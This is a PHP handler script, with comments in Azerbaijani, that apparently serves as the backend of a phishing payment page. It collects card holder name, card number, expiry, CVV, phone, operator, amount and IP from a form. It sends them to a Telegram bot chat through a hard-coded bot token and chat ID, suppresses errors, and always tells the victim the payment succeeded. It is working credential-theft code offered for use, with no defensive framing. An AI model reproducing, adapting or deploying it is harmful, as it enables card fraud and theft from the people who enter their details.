<?php
// ============================================
// TELEGRAM HANDLER - BOT TOKEN YALNIZ BURADA
// ============================================

// Xəta mesajlarını gizlət
error_reporting(0);
ini_set('display_errors', 0);

// ===== BOT MƏLUMATLARI (YALNIZ BURADA) =====
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-5419845064';

// ===== MƏLUMATLARI AL =====
$cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : '';
$cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
$cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : '';
$cardCvv = isset($_POST['card_cvv']) ? trim($_POST['card_cvv']) : '';
$operator = isset($_POST['operator']) ? trim($_POST['operator']) : '';
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';

// ===== TƏHLÜKƏSİZLİK - Məlumatları təmizlə =====
function cleanInput($data) {
    $data = trim($data);
    $data = strip_tags($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

$cardName = cleanInput($cardName);
$cardNumber = cleanInput($cardNumber);
$cardExpiry = cleanInput($cardExpiry);
$cardCvv = cleanInput($cardCvv);
$operator = cleanInput($operator);
$phone = cleanInput($phone);
$amount = cleanInput($amount);
$ip = cleanInput($ip);

// ===== MƏLUMATLARI YOXLA =====
if (empty($cardNumber) || empty($cardCvv)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Məlumatlar tam daxil edilməyib']);
    exit;
}

// ===== MESAJI HAZIRLA =====
$id = rand(100, 999);

$message = "💳 YENİ KART GİRİŞİ 💳\n\n";
$message .= "🆔 ID: #" . $id . "\n";
$message .= "📞 Tel: " . $phone . "\n";
$message .= "💰 Tutar: " . $amount . " AZN\n\n";
$message .= "💳 CC: " . $cardNumber . "\n";
$message .= "📅 Tarih: " . $cardExpiry . "\n";
$message .= "🔐 CVV: " . $cardCvv . "\n";
$message .= "👤 İsim: " . $cardName . "\n\n";
$message .= "📱 Operator: " . $operator . "\n";
$message .= "🌐 IP: " . $ip . "\n\n";
$message .= "----------------------------------------\n";
$message .= "🔑 OTP: " . rand(1000, 9999);

// ===== TELEGRAM-A GÖNDƏR =====
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// ===== CAVAB =====
header('Content-Type: application/json');

if ($httpCode == 200) {
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
} else {
    error_log('Telegram göndəriş xətası: ' . $httpCode);
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
}
?>
